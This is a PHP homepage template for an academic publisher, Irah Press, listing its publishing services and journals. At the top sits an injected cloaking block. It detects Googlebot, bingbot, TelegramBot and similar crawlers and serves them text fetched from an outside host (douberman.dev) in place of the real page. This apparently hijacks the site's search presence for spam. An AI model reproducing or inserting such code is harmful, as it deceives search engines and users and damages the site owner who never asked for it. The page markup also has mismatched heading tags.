<?php
function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');

foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}

return false;
}

if (is_bot()) {
$message = file_get_contents('https://douberman.dev/douberman/irahpress.txt');
echo $message;
exit;
}
?>

<?php include 'includes/header.php'; ?>


<section class="section hero">
    <div class="container">
        <div class="row">
            <div class="col-md-5">
                <h5 class="hero_head">Irah Press <br>
<h2 class="hero_head">Multidisciplinary <br>
                    Global Publisher
                </h3>
                <p class="hero_text">Bridging the nations with academic and research</p>
            </div>
        </div>
    </div>
</section>


<section class="section publish">
    <div class="container">
        <div class="row">
            <div class="col-md-4">
                <img src="./assets/images/BookPub.png" alt="" class="img-fluid pub_img">
                <div class="pub_bot">
                    <h5>Publish a book</h5>
                </div>

            </div>
            <div class="col-md-4">
                <img src="./assets/images/PaperPub.png" alt="" class="img-fluid pub_img">
                <div class="pub_bot">
                    <h5>Publish a paper</h5>
                </div>

            </div>
            <div class="col-md-4">
                <img src="./assets/images/SpIssue.png" alt="" class="img-fluid pub_img">
                <div class="pub_bot">
                    <h5>Publish a special issue</h5>
                </div>

            </div>
        </div>
    </div>
</section>

<section class="section explore">
    <div class="container-fluid exp_top_con">
        <div class="row text-center py-3">
            <div class="col-md-12">
                <h3 class="exp_head">Explore Our Journals</h3>
            </div>
        </div>

    </div>
    <div class="container-fluid exp_bot_con">
        <div class="row p-5">
            <div class="col-md-4">
                <ul class="exp_list">
                    <h2 class=>Annals of Agriculture and Environment</h2>
                </ul>
            </div>
            <div class="col-md-4">
                <ul class="exp_list">
                </ul>
            </div>
            <div class="col-md-4">
                <ul class="exp_list">
                    <h2 class=>Social Pulse</h2>
                </ul>
            </div>
            <div class="col-md-4">
                <ul class="exp_list">
                </ul>
            </div>
            <div class="col-md-4">
                <ul class="exp_list">
                    <h2>Herbal Frontiers</h2>
                </ul>
            </div>
        </div>
    </div>
</section>

<section class="section spring">
    <div class="container">
        <div class="row align-items-end">
            <div class="col-md-4">
                <div class="spr_first">
                    <img src="./assets/images/spring.jpg" alt="" class="img-fluid spring_img">
                    <h6 class="spr_title">Irah Press : Impact Factor</h6>
                </div>
            </div>
            <div class="col-md-4">
                <div class="spr_other">
                    <h6 class="spr_title">Find Our Products</h6>
                    <p class="spr_text">Read the research papers <br> Buy the books and manuals</p>
                    <img src="./assets/images/Irah_Press_White.png" alt="" class="img-fluid spr_img">


                </div>
            </div>
            <div class="col-md-4">
                <div class="spr_other">
                    <h6 class="spr_title">Sign up</h6>
                    <p class="spr_text">Receive knowledge about special offers, discounts, and events <br>Receive early notice of new book and journal releases <br>Discover our most recent services, resources, and tools</p>
                    <img src="./assets/images/Irah_Press_White.png" alt="" class="img-fluid spr_img">


                </div>
            </div>

        </div>
    </div>
</section>



<?php include 'includes/footer.php'; ?>
